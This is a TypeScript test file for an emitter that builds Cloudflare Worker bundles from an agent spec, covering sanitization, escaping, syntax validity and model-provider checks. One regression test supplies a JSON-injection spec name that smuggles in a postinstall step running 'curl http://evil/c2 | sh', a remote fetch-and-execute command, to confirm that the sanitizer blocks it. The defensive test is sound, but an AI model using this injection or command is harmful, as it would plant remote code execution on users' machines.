import { describe, expect, test } from "bun:test";
import type { IrV0 } from "@crewhaus/ir";
import { TargetEmitError, emitCfWorkerCli } from "./index";

const baseIr: IrV0 = {
  version: 0,
  name: "hello-cli",
  target: "cli",
  agent: {
    model: "claude-haiku-4-5-20251001",
    instructions: "You are a helpful assistant.",
  },
  tools: [],
  toolConfigs: Object.freeze({}),
  mcp_servers: Object.freeze({}),
  permissions: { rules: [] },
  subAgents: [],
  compaction: {},
};

describe("emitCfWorkerCli", () => {
  test("emits worker.js, wrangler.toml, package.json, and the generated README (item 42)", () => {
    const bundle = emitCfWorkerCli(baseIr);
    const paths = bundle.files.map((f) => f.path).sort();
    expect(paths).toEqual(["README.md", "package.json", "worker.js", "wrangler.toml"]);
    // The Worker README substitutes the wrangler flow for the local run snippet.
    const readme = bundle.files.find((f) => f.path === "README.md")?.content ?? "";
    expect(readme).toContain("wrangler deploy");
    expect(readme).not.toContain("bun agent.ts");
  });

  test("readme: false restores the three-file bundle (item 42 opt-out)", () => {
    const bundle = emitCfWorkerCli(baseIr, { readme: false });
    expect(bundle.files.map((f) => f.path).sort()).toEqual([
      "package.json",
      "worker.js",
      "wrangler.toml",
    ]);
  });

  test("worker.js inlines model and instructions", () => {
    const bundle = emitCfWorkerCli(baseIr);
    const worker = bundle.files.find((f) => f.path === "worker.js");
    expect(worker?.content).toContain("claude-haiku-4-5-20251001");
    expect(worker?.content).toContain("You are a helpful assistant.");
    expect(worker?.content).toContain("api.anthropic.com");
  });

  test("wrangler.toml uses sanitized spec name", () => {
    const ir: IrV0 = { ...baseIr, name: "Hello World!" };
    const bundle = emitCfWorkerCli(ir);
    const wrangler = bundle.files.find((f) => f.path === "wrangler.toml");
    expect(wrangler?.content).toContain('name = "hello-world-"');
  });

  // Regression — issue #148 (CWE-94). A raw ir.name in the package.json name
  // field could break out of the JSON string and inject a postinstall script.
  test("package.json sanitizes the spec name and resists JSON injection", () => {
    const ir: IrV0 = {
      ...baseIr,
      name: '", "scripts": { "postinstall": "curl http://evil/c2 | sh" }, "x": "',
    };
    const pkg = emitCfWorkerCli(ir).files.find((f) => f.path === "package.json");
    expect(pkg).toBeDefined();
    const parsed = JSON.parse(pkg?.content ?? "") as {
      name: string;
      scripts: Record<string, string>;
    };
    expect(parsed.name).not.toContain('"'); // sanitized to [a-z0-9-]
    expect(parsed.scripts["postinstall"]).toBeUndefined(); // injection did not break out
    expect(parsed.scripts).toEqual({ deploy: "wrangler deploy", dev: "wrangler dev --local" });
  });

  test("worker.js escapes special characters in instructions", () => {
    const ir: IrV0 = {
      ...baseIr,
      agent: {
        ...baseIr.agent,
        instructions: 'Respond with "quoted" text\nand newlines.',
      },
    };
    const bundle = emitCfWorkerCli(ir);
    const worker = bundle.files.find((f) => f.path === "worker.js");
    expect(worker?.content).toContain('\\"quoted\\"');
    expect(worker?.content).toContain("\\n");
  });

  test("rejects non-cli IR variants", () => {
    const wrong = { ...baseIr, target: "workflow" } as unknown as IrV0;
    expect(() => emitCfWorkerCli(wrong)).toThrow(TargetEmitError);
  });

  test("rejects CLI IR with tools until M2", () => {
    const ir: IrV0 = { ...baseIr, tools: ["read", "write"] };
    expect(() => emitCfWorkerCli(ir)).toThrow(TargetEmitError);
  });

  // Regression: the emitter previously wrapped JSON.stringify output in an
  // extra pair of quotes (`name: ""hello-cli""`), which Cloudflare rejected
  // at upload with "Unexpected identifier 'hello' at worker.js:5:10". The
  // substring assertions above missed it, so parse the whole module instead.
  const parseJs = (code: string) => new Bun.Transpiler({ loader: "js" }).transformSync(code);

  test("worker.js is syntactically valid JavaScript", () => {
    const worker = emitCfWorkerCli(baseIr).files.find((f) => f.path === "worker.js");
    expect(() => parseJs(worker?.content ?? "")).not.toThrow();
  });

  test("worker.js stays valid with hyphenated name and tricky instructions", () => {
    const ir: IrV0 = {
      ...baseIr,
      name: "hello-cli",
      agent: {
        ...baseIr.agent,
        instructions: 'Quotes "here", a newline\nhere, a ${dollar} and a ` backtick.',
      },
    };
    const worker = emitCfWorkerCli(ir).files.find((f) => f.path === "worker.js");
    expect(() => parseJs(worker?.content ?? "")).not.toThrow();
  });
});

describe("emitCfWorkerCli — provider gate", () => {
  test("an openai/ spec fails at compile time with the cf-worker hint", () => {
    const ir: IrV0 = {
      ...baseIr,
      agent: { ...baseIr.agent, model: "openai/gpt-4o-mini" },
    };
    expect(() => emitCfWorkerCli(ir)).toThrow(TargetEmitError);
    expect(() => emitCfWorkerCli(ir)).toThrow(
      /cf-worker targets currently support claude-\* models only — use the cli target for other providers/,
    );
    expect(() => emitCfWorkerCli(ir)).toThrow(/openai/);
  });

  test("gemini/, bedrock/, and local/ specs are all rejected", () => {
    for (const model of [
      "gemini/gemini-2.5-flash",
      "bedrock/us.anthropic.claude-sonnet-4-5-20250929-v1:0",
      "local/llama3.2@http://localhost:11434/v1",
    ]) {
      const ir: IrV0 = { ...baseIr, agent: { ...baseIr.agent, model } };
      expect(() => emitCfWorkerCli(ir)).toThrow(TargetEmitError);
    }
  });

  test("an unparseable model string surfaces as TargetEmitError, not a raw ConfigError", () => {
    const ir: IrV0 = { ...baseIr, agent: { ...baseIr.agent, model: "gpt-4o-mini" } };
    expect(() => emitCfWorkerCli(ir)).toThrow(TargetEmitError);
    expect(() => emitCfWorkerCli(ir)).toThrow(/unrecognised model string/);
  });

  test("claude-* models still emit cleanly", () => {
    expect(emitCfWorkerCli(baseIr).files.length).toBe(4);
  });
});

describe("emitCfWorkerCli — failure_taxonomy ignored-note (item 23)", () => {
  test("worker.js carries the ignored-taxonomy note when the spec declares one", () => {
    const ir: IrV0 = {
      ...baseIr,
      failureTaxonomy: [{ class: "rate_limited", pattern: "/429/", recovery: "retry" }],
    };
    const code = emitCfWorkerCli(ir).files[0]?.content ?? "";
    expect(code).toContain(
      "failure_taxonomy configured but target-cf-worker-cli does not yet wire it up",
    );
  });

  test("no note when the spec omits failure_taxonomy", () => {
    expect(emitCfWorkerCli(baseIr).files[0]?.content ?? "").not.toContain(
      "failure_taxonomy configured",
    );
  });
});
